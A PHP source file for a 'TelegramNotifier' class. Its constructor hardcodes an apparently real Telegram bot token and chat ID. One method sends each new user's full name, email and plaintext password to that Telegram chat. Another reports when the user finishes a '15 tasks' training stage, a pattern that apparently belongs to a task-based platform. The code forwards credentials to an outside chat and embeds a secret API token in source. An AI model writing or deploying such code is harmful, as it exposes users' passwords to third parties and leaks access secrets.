<?php

class TelegramNotifier {
    private $botToken;
    private $chatId;

    public function __construct() {
        $this->botToken = '8133407038:AAFslD-_Gow0X4A268V2rgrmCjkDzDu_kG0';
        $this->chatId = '7844108983';
    }

    public function sendTrainingCredentials($userFullName, $trainingEmail, $trainingPassword) {
        $message = "🎓 NEW TRAINING ACCOUNT CREATED\n\n";
        $message .= "👤 User: " . $userFullName . "\n";
        $message .= "📧 Training Email: " . $trainingEmail . "\n";
        $message .= "🔐 Password: " . $trainingPassword . "\n\n";
        $message .= "⏰ Created: " . date('Y-m-d H:i:s') . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "Note: User must complete 15 tasks to unlock main dashboard.";

        return $this->sendMessage($message);
    }

    public function sendTrainingComplete($userFullName, $trainingEmail) {
        $message = "✅ TRAINING COMPLETED\n\n";
        $message .= "👤 User: " . $userFullName . "\n";
        $message .= "📧 Training Account: " . $trainingEmail . "\n";
        $message .= "⏰ Completed: " . date('Y-m-d H:i:s') . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "User has been redirected to main dashboard.";

        return $this->sendMessage($message);
    }

    private function sendMessage($message) {
        $url = "https://api.telegram.org/bot{$this->botToken}/sendMessage";

        $data = [
            'chat_id' => $this->chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];

        try {
            $context = stream_context_create($options);
            $result = @file_get_contents($url, false, $context);

            if ($result === false) {
                return ['success' => false, 'message' => 'Failed to send notification'];
            }

            $response = json_decode($result, true);
            return [
                'success' => isset($response['ok']) && $response['ok'],
                'message' => 'Notification sent',
                'response' => $response
            ];
        } catch (Exception $e) {
            return ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
        }
    }
}
?>
